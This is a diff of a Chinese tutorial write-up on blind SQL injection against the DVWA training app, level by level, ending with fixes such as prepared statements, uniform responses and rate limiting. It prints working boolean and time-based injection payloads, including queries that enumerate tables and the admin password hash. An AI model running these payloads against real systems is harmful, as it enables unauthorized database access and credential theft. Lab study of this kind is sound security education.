@@ -1,143 +1,130 @@
 # SQL Injection(Blind)
 
-同样的查询，但页面不回显数据，只告诉你一句 `User ID exists in the database.` 或者 `User ID is MISSING from the database.`
+查询结果不回显，页面只有两句话：`User ID exists in the database.` 和 `User ID is MISSING from the database.` 没有回显，就只能把每条数据拆成是非题，一次问一位。
 
-没有回显，就只能问是非题：一次问一个问题，答案就是页面返回的那两个词。这就是盲注的起点。
+## 漏洞在哪
 
-## 先确认真假能控制页面
+和普通注入同一处拼接，只是输出被藏了：
 
-```
-1' AND '1'='1     → User ID exists in the database.
-1' AND '1'='2     → User ID is MISSING from the database.
-```
-
-![恒真](low1.png)
-
-![恒假](low2.png)
-
-恒真返回存在、恒假返回不存在，说明能通过条件真假影响输出，可以盲注了。
-
-注释符用 `#` 或 `-- `。放 URL 里 `#` 会被浏览器截断，必须写成 `%23`：
-
-```
-?id=1' AND 1=1%23&Submit=Submit
+```php
+$id = $_GET['id'];
+$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
+// 结果只用于判断有没有记录，不显示内容
 ```
 
-## 布尔盲注：一位一位问
+注入仍然成立，只是"数据"要通过页面的两种响应间接读出来。
 
-先问长度，用二分法比一位一位试快得多：
+## 等级对照
 
+| 等级 | 防护 | 本机结果 |
+|---|---|---|
+| Low | 无 | 布尔盲注 + 时间盲注均成功 |
+| Medium | POST 提交，部分字符转义 | URL 编码后布尔盲注成功 |
+| High | Session 传参，加 `LIMIT 1` | 注释截断后成功 |
+| Impossible | 预编译 | 打不进去 |
+
+## Low
+
+| 项 | 内容 |
+|---|---|
+| 判点 | `1' AND '1'='1` 返回 exists，`1' AND '1'='2` 返回 missing |
+| 注释 | `#` 需编码为 `%23`，`-- ` 需补空格 |
+| 长度 | `LENGTH(DATABASE())=4`，可得库名长度 |
+| 字符 | `SUBSTRING(DATABASE(),1,1)='d'` 逐位判断 |
+
+```sql
+?id=1' AND '1'='1%23
+?id=1' AND LENGTH(DATABASE())>3-- -
+?id=1' AND SUBSTRING(DATABASE(),1,1)='d'-- -
+?id=1' AND ASCII(SUBSTRING(DATABASE(),1,1))=100-- -
 ```
-1' AND LENGTH(DATABASE())=4#
-1' AND LENGTH(DATABASE())>3-- -
-1' AND LENGTH(DATABASE())>5-- -
-```
 
-返回存在就说明当前库名长度是 4。
+库名确定后套子查询，顺序是表数 → 表名 → 字段 → 数据：
 
-再问字符，`SUBSTRING` 一次取一位：
-
-```
-1' AND SUBSTRING(DATABASE(),1,1)='d'-- -
-1' AND SUBSTRING(DATABASE(),2,1)='v'-- -
-```
-
-按这个顺序问下来就是 `dvwa`。每个位置理论上要试 36 次（字母加数字），加上 ASCII 二分能压到 7 次左右：
-
-```
-1' AND ASCII(SUBSTRING(DATABASE(),1,1))>100-- -
-```
-
-库名拿下之后是同一条路，套进子查询：
-
-```
+```sql
 1' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE())=2-- -
 1' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1))=9-- -
 1' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1),1,1)='g'-- -
+1' AND LENGTH((SELECT password FROM users WHERE user='admin'))=32-- -
 ```
 
-`LIMIT 0,1` 是取第几张表。第一张表名长度 9，是 `guestbook`；要问第二张就把 `0,1` 改成 `1,1`。
+`LIMIT 0,1` 里的 0 是偏移，换成 `1,1` 就是第二张表。第一张表名长度 9，是 `guestbook`。
 
-字段名、用户名、密码哈希都是同一个套路，换个表名的事。users 表里五个用户，第一个是 `admin`，密码哈希 32 位，`5f4dcc3b...` 那个。
+时间盲注用于页面真假都无差异的场景，条件成立时让数据库睡三秒：
 
-![枚举用户名第一位](low3.png)
-
-## 时间盲注：连真假都看不见的时候
-
-如果页面不管条件真假都返回同一句话，布尔这条路也断了。这时候用时间当信道：条件成立就让数据库睡三秒。
-
-```
+```sql
 1' AND SLEEP(3)-- -
-```
-
-页面明显卡三秒，说明 `SLEEP` 执行了，能注入。
-
-把条件塞进 `IF`：
-
-```
 1' AND IF(LENGTH(DATABASE())=4,SLEEP(3),0)-- -
 1' AND IF(SUBSTRING(DATABASE(),1,1)='d',SLEEP(3),0)-- -
 1' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))=100,SLEEP(3),0)-- -
 ```
 
-数据量一大就很难受。32 位哈希要问 32 个字符，每个字符最坏 36 次，一次 3 秒，光一条密码就是好几个小时。所以真实场景里时间盲注基本都交给 sqlmap，手工只用来验证注入点是否成立。
+32 位哈希按位问，一次 3 秒，最坏要几小时。时间盲注手工只用来验证注入点，取数交给工具。
+
+![恒真](low1.png)
+
+![恒假](low2.png)
+
+![枚举用户名](low3.png)
 
 ## Medium
 
-页面变成下拉框，请求变成 POST，特殊字符被转义。抓包后请求体是这样：
+| 项 | 内容 |
+|---|---|
+| 变化 | 下拉框选择 ID，请求改为 POST，部分字符转义 |
+| 处理 | 抓包改请求体，空格编码为 `%20` |
+| 回退 | 单引号失效时改用 ASCII 判断 |
 
 ```
 POST /dvwa/vulnerabilities/sqli_blind/ HTTP/1.1
 Cookie: security=medium; PHPSESSID=xxxx
 
-id=1&Submit=Submit
-```
-
-数字型，不用闭合引号。改请求体的时候注意 URL 编码，空格是 `%20`：
-
-```
-id=1 AND 1=1&Submit=Submit
+id=1%20AND%201=1&Submit=Submit
 id=1%20AND%201=2&Submit=Submit
-```
-
-前者 exists、后者 missing，注入成立。
-
-后面照旧，只是单引号进了请求体容易被吃掉，遇到 `'d'` 不生效就换 ASCII：
-
-```
+id=1%20AND%20LENGTH(DATABASE())=4&Submit=Submit
 id=1%20AND%20ASCII(SUBSTRING(DATABASE(),1,1))=100&Submit=Submit
 ```
 
-时间盲注同理：
-
-```
-id=1 AND IF(ASCII(SUBSTRING(DATABASE(),1,1))=100,SLEEP(3),0)
-```
+数字型，不需要闭合引号。前两条一条 exists 一条 missing，说明注入成立。
 
 ## High
 
-High 把参数存进 Session，页面拆成两步提交，SQL 末尾加了 `LIMIT 1`。Session 只是换了个传参位置，Burp 抓的还是同一个请求，改 `id` 就行。`LIMIT 1` 照例用注释符切掉：
+| 项 | 内容 |
+|---|---|
+| 变化 | 参数存 Session，页面拆两步提交，SQL 末尾加 `LIMIT 1` |
+| 绕过 | `-- -` 注释掉 `' LIMIT 1` |
+| 结果 | 与 Low 一致 |
 
-```
+```sql
 1' AND 1=1-- -
+1' AND ASCII(SUBSTRING(DATABASE(),1,1))=100-- -
+1' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))=100,SLEEP(3),0)-- -
 ```
 
-`-- -` 把后面的 `' LIMIT 1` 注释掉，剩下的和 Low 一样。
+Session 只是换了传参位置，Burp 抓到的仍是同一个请求，改 `id` 即生效。
 
-## Impossible 为什么打不进去
+## Impossible
 
-和上一节的 SQL 注入同一个原因：预编译加 `bind_param("i", $id)`，输入永远只是值。另外还加了 Anti-CSRF token 和输入类型校验。
+```php
+$stmt = $mysqli->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
+$stmt->bind_param("i", $id);
+$stmt->execute();
+```
 
-## 我卡住的地方
+另加 Anti-CSRF token 与输入类型校验。输入永远只是值，条件真假不再由用户控制。
 
-- `#` 直接写在 URL 里会失效，第一次试了半天以为过滤了，其实是浏览器把 `#` 后面当锚点，请求根本没发出去。看到 `%23` 才反应过来。
-- `LIMIT 0,1` 里的 `0` 是偏移不是序号，改成 `1,1` 才是第二张表。这个记错过一次。
-- 时间盲注第一次只试了 `SLEEP(3)`，看到慢了三秒就以为成了，其实还得用 `IF` 包条件才算真的能用。
+## 容易记错的地方
+
+- `#` 直接写在 URL 里会被浏览器当锚点截断，请求根本发不出去，必须用 `%23`。
+- `LIMIT 0,1` 的 0 是偏移不是序号，这个记错过两次。
+- 只试 `SLEEP(3)` 看到慢了三秒不算成功，得用 `IF` 包住条件才算真能用。
+- 盲注的判据是响应差异，任何能造成差异的东西都能当信道：状态码、长度、跳转。
 
 ## 怎么修
 
-同上一节，参数化查询是主因。盲注之所以存在，是因为"存在/不存在"这两种响应本身泄露了一位信息。所以除了修注入点，还可以：
-
-1. 统一提示。查到和没查到返回一模一样的页面、一样的长度。
-2. 关掉 SQL 报错，别让长度和时间出现可测的差异。
-3. 对同一 IP 的查询做频率限制。盲注要靠成千上万次请求，限速直接让它跑不完。
+| 措施 | 作用 |
+|---|---|
+| 预编译 + 参数绑定 | 根治注入 |
+| 统一响应 | 查到与查不到返回同一页面、同一长度 |
+| 关闭错误回显 | 消除长度与时间上的可测差异 |
+| 请求频率限制 | 盲注要上万次请求，限速直接让它跑不完 |
